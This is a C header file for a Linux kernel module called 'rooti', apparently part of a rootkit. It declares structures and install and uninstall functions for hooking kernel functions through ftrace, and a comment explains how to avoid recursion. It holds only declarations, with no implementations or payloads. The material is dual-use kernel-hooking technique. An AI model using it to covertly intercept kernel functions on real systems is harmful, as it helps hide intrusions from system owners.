#ifndef _ROOTI_HOOKING_FUNC_H
#define _ROOTI_HOOKING_FUNC_H

#include <linux/ftrace.h>

/* 
 * Recursion loops protection mechanism - often times hook functions in this module
 * will call their original predecessor. The call to the original kernel function would trigger the
 * ftrace callback, which would in turn point to the hook function, which would call the original function
 * and so on and so forth. We've got two ways to handle this:
 * 1. Skip the call to ftrace by setting the original function pointer (e.g rooti_function_hook.orig) to the memory
 *    address of the instruction after the instruction to call ftrace. Used by setting ROOTI_USE_FENTRY_OFFSET
 * 2. Check the return address of the traced function to ensure that the callback will point to the hook function
 *    only if the original function was NOT called by the hook function itself.
 *    Used by clearing ROOTI_USE_FENTRY_OFFSET
 */
#define ROOTI_USE_FENTRY_OFFSET 1
#if !ROOTI_USE_FENTRY_OFFSET
#pragma GCC optimize("-fno-optimize-sibling-calls")
#endif

// Shorthand for initializing function hook objects
#define ROOTI_FUNC_HOOK(_name, _hook, _orig) \
{ \
    .name = (_name), \
    .func = (_hook), \
    .orig = (_orig)  \
}

// Represents a function hook achieved by abusing the ftrace framework.
struct rooti_func_hook {
    char *name;            // hooked function name
    void *func;            // pointer to hook function
    void *orig;            // pointer to the original function
    unsigned long addr;    // real memory address of the original function
    struct ftrace_ops ops; // ftrace configuration
};

int rooti_install_func_hook(struct rooti_func_hook *hook);
int rooti_install_func_hooks(struct rooti_func_hook *hooks, size_t count);
void rooti_uninstall_func_hook(struct rooti_func_hook *hook);
void rooti_uninstall_func_hooks(struct rooti_func_hook *hooks, size_t count);

#endif